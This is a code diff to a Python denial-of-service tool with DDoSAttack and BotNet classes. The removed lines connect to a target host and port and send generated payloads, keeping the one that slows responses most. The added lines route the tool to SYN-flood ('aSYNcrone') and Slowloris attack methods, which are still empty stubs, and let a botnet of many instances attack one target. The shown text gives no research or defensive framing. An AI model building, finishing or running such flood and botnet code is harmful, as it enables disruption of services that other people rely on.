@@ -1,10 +1,8 @@
 import torch
 import torch.nn as nn
-import socket
 import threading
 from .random_string_generator import RandomStringGenerator
 import logging
-import time
 
 logging.basicConfig(
     level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
@@ -12,10 +10,13 @@ logging.basicConfig(
 
 
 class DDoSAttack:
-    def __init__(self, target_ip, target_port, num_connections):
+    def __init__(
+        self, target_ip, target_port, num_connections, attack_type="aSYNcrone"
+    ):
         self.target_ip = target_ip
         self.target_port = target_port
         self.num_connections = num_connections
+        self.attack_type = attack_type
         self.threads = []
         self.model = RandomStringGenerator()
 
@@ -26,31 +27,20 @@ class DDoSAttack:
             thread.start()
 
     def run_attack(self):
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect((self.target_ip, self.target_port))
-            # Generate different types of payloads and pick the one that leads to maximum disruption
-            max_disruption = -1
-            best_payload = None
-            for _ in range(10):  # try 10 different types of payloads
-                payload = self.model.generate_payload()
-                start_time = time.time()
-                self.send_payload(sock, payload)
-                response_time = time.time() - start_time
-                disruption = self.measure_disruption(response_time)
-                if disruption > max_disruption:
-                    max_disruption = disruption
-                    best_payload = payload
-            logging.info(f"Best payload: {best_payload}")
-        except Exception as e:
-            logging.error(f"Exception occurred while running an attack: {e}")
+        if self.attack_type == "aSYNcrone":
+            self.aSYNcrone_attack()
+        elif self.attack_type == "slowloris":
+            self.slowloris_attack()
+        else:
+            logging.error(f"Unknown attack type: {self.attack_type}")
 
-    def send_payload(self, sock, payload):
-        sock.send(payload.encode())
+    def aSYNcrone_attack(self):
+        # TODO: Implement the aSYNcrone attack here
+        raise NotImplementedError
 
-    def measure_disruption(self, response_time):
-        # The longer the response time, the higher the disruption
-        return response_time
+    def slowloris_attack(self):
+        # TODO: Implement the Slowloris attack here
+        raise NotImplementedError
 
     def wait_for_threads(self):
         for thread in self.threads:
@@ -58,16 +48,21 @@ class DDoSAttack:
 
 
 class BotNet:
-    def __init__(self, num_bots, target_ip, target_port, num_connections):
+    def __init__(
+        self, num_bots, target_ip, target_port, num_connections, attack_type="aSYNcrone"
+    ):
         self.num_bots = num_bots
         self.target_ip = target_ip
         self.target_port = target_port
         self.num_connections = num_connections
+        self.attack_type = attack_type
         self.bots = []
 
     def create_bots(self):
         for _ in range(self.num_bots):
-            bot = DDoSAttack(self.target_ip, self.target_port, self.num_connections)
+            bot = DDoSAttack(
+                self.target_ip, self.target_port, self.num_connections, self.attack_type
+            )
             self.bots.append(bot)
 
     def launch_attack(self):
